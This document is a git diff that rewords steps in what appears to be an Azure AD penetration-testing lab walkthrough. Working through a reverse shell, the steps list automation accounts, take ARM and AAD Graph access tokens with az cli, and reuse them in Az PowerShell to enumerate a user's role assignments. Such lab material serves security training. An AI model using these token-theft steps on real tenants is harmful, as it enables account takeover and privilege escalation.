@@ -687,18 +687,15 @@ Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObject
 - Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
 ```az automation account list```
 - Now, we should be able to list roles assigned to Mark using ```az role assignment list --assignee MarkDWalden@defcorphq.onmicrosoft.com``` on the reverse shell but it does not return an output.
-- Therefore, we request an access token for ARM and use the one for aad-graph that we requested earlier and use both with Az PowerShell.
-  
-- Run the below command on the reverse shell to request an access token for ARM:
+- Therefore, we request an access token for ARM and use the one for aad-graph that we requested earlier and use both with Az PowerShell, back on the **Student VM**.
+
+Request tokens from the shell with Azure CLI:
 ```
 az account get-access-token
-```
- - To request an access token for add-graph:
-```
 az account get-access-token --resource-type aad-graph
 ```
 
-- Back on the **STUDENT VM** Use the below command for using both the tokens with Az PowerShell on student VM: 
+- Back on the **STUDENT VM** use the tokens with Az PowerShell: 
 ```
 PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
 PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
@@ -706,7 +703,7 @@ PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
 PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
 ```
 
-Run the below command to get the role for Mark (added to the Aumtation Accounts group) on the automation account: 
+Now we can run the below command to look at the roles for Mark (added to the Aumtation Accounts group) on the automation account: 
 ```
 PS C:\AzAD\Tools> Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
 ```
